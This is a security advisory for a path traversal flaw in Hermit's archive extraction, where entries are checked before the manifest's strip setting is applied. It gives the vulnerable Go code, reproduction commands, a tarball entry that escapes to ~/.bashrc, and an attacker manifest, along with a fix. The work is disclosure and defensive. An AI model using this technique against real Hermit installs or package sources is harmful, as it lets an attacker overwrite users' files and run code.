# Hermit: Path Traversal via strip-after-sanitize in Archive Extraction (RCE)

## Summary

A path traversal vulnerability in [cashapp/hermit](https://github.com/cashapp/hermit)'s archive extraction logic allows an attacker who controls a package manifest to write arbitrary files to the filesystem, leading to remote code execution (RCE) via `.bashrc` overwrite.

The root cause is a **time-of-check/time-of-use (TOCTOU)** ordering flaw in `archive/archive.go`: the `makeDestPath()` function validates archive entry names for directory traversal **before** applying the `strip` operation. Since `strip` operates on raw string-split components (preserving `..` literals), an attacker can craft entry names that pass sanitization but escape the extraction directory after strip is applied.

**CVSS 3.1**: 9.8 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

## Vulnerability Details

### Affected Code

**File:** `archive/archive.go`, lines 644–664

```go
// makeDestPath — the VULNERABLE function (lines 644-655)
func makeDestPath(dest, path string, strip int) (string, error) {
    // BUG: sanitize happens BEFORE strip
    if err := sanitizeExtractPath(path, dest); err != nil {
        return "", err
    }
    parts := strings.Split(path, "/")
    if len(parts) <= strip {
        return "", nil
    }
    // strip happens AFTER sanitize — on raw string components
    destFile := strings.Join(parts[strip:], "/")
    destFile = filepath.Join(dest, destFile)
    return destFile, nil
}

// sanitizeExtractPath — the sanitizer (lines 658-664)
func sanitizeExtractPath(filePath string, destination string) error {
    destPath := filepath.Join(destination, filePath)
    if !strings.HasPrefix(destPath, filepath.Clean(destination)) {
        return errors.Errorf("illegal file path")
    }
    return nil
}
```

### The Flaw

`sanitizeExtractPath()` uses `filepath.Join(destination, filePath)` which internally calls `filepath.Clean()`, eagerly resolving all `..` components. For a balanced entry like `d1/d2/d3/d4/../../../../.bashrc`, the forward directories cancel out the `..` components, and the cleaned result `dest/.bashrc` passes the `HasPrefix` check.

However, `strings.Split(path, "/")` in the next step preserves `..` as **literal string components**. When `strip=4` removes the first 4 parts (`d1`, `d2`, `d3`, `d4`), the remaining components are `["..", "..", "..", "..", ".bashrc"]`. The subsequent `filepath.Join(dest, "../../../../.bashrc")` resolves these `..` against the real filesystem, escaping the package directory.

### Mathematical Proof

For an entry with `F` forward dummy directories and `B` back (`..`) components:

- **Sanitize passes** when `F >= B` (forward/back pairs cancel in `filepath.Clean`)
- **Escape after strip=S** when `S > F - B` (strip removes forward dirs, unbalanced `..` remains)

Combined constraint: `0 <= F - B < S` — satisfiable for **any** `S >= 1`.

Optimal exploit: set `F = B = S` (e.g., `strip=4` with 4 dummies + 4 dotdots).

### Attacker Control

The `strip` field is defined in the package manifest (`manifest/config.go:36`):

```go
Strip int `hcl:"strip,optional"`
```

Package manifests are fetched from manifest repositories. An attacker who controls or compromises a manifest source can set `strip` to any value, tuning the traversal depth to target any file relative to the user's home directory.

### Impact

With default `HERMIT_STATE_DIR` (`~/.cache/hermit`), packages extract to `~/.cache/hermit/pkg/<name>-<version>/` — **4 levels** below `~`. Using `strip=4`, the attacker can overwrite:

| Target | Impact |
|--------|--------|
| `~/.bashrc` | RCE on next shell open (alias injection, reverse shell) |
| `~/.ssh/authorized_keys` | Persistent SSH access |
| `~/.config/autostart/*.desktop` | RCE on next GUI login |
| `~/.gitconfig` | Supply-chain via malicious git hooks |

## Reproduction Steps

### Prerequisites
- Linux system (tested on Kali 2024.4)
- Hermit v0.50.0 (latest stable as of testing)
- Non-root user

### Quick Reproduction

```bash
# 1. Clone the PoC repository
git clone https://github.com/acrinion-oss/hermit-strip-poc.git ~/hermit-strip-poc
cd ~/hermit-strip-poc

# 2. CRITICAL: Clear any cached package extraction from previous runs
#    Hermit skips extraction if the pkg directory already exists
#    (state/state.go:317, isExtracted at :444)
rm -rf ~/.cache/hermit/pkg/rce-poc*

# 3. Initialize hermit environment pointing to local manifests
hermit init --sources env:///packages

# 4. Install the exploit package (triggers the path traversal)
. ./bin/activate-hermit
hermit install rce-poc-1.0.0

# 5. Verify: ~/.bashrc now contains the attacker's payload
cat ~/.bashrc
# Output includes: alias sudo='echo "[!] RCE via hermit strip-after-sanitize" && /usr/bin/sudo'

# 6. Demonstrate RCE: open a new shell and run sudo
bash
sudo ls   # Prints: "[!] RCE via hermit strip-after-sanitize"
```

### Automated Reproduction

```bash
bash reproduce.sh
```

### What the PoC Contains

| File | Purpose |
|------|---------|
| `packages/rce-poc.hcl` | Attacker-controlled manifest with `strip = 4` |
| `packages/malicious-rce.tar.gz` | Tarball with path-traversal entry |
| `generate_tarball.py` | Script to regenerate the tarball |
| `reproduce.sh` | Automated repro with annotations |

### Tarball Structure

```
$ tar tzf packages/malicious-rce.tar.gz
d1/d2/d3/d4/bin/tool                      <- Legitimate binary
d1/d2/d3/d4/../../../../.bashrc            <- EXPLOIT: escapes after strip=4
```

### Manifest (packages/rce-poc.hcl)

```hcl
description = "RCE proof of concept"
binaries = ["bin/tool"]
strip = 4                                   # Attacker controls this!

version "1.0.0" {
  source = "${env}/packages/malicious-rce.tar.gz"
}
```

## Suggested Fix

Apply `strip` **before** sanitization, or sanitize the **post-strip** path:

```go
func makeDestPath(dest, path string, strip int) (string, error) {
    parts := strings.Split(path, "/")
    if len(parts) <= strip {
        return "", nil
    }
    destFile := strings.Join(parts[strip:], "/")
    // Sanitize the STRIPPED path, not the raw entry name
    if err := sanitizeExtractPath(destFile, dest); err != nil {
        return "", err
    }
    destFile = filepath.Join(dest, destFile)
    return destFile, nil
}
```

**Note:** The codebase already implements the correct pattern in `sanitizeSymlinkTarget()` (archive.go:670-686), which uses `filepath.Clean(dest) + string(filepath.Separator)` — proving the developers understood the risk but didn't apply the fix consistently.

## References

- Vulnerable code: `archive/archive.go:644-664`
- Correct pattern (symlinks): `archive/archive.go:670-686`
- Strip config: `manifest/config.go:36`
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-367: Time-of-Check Time-of-Use (TOCTOU) Race Condition
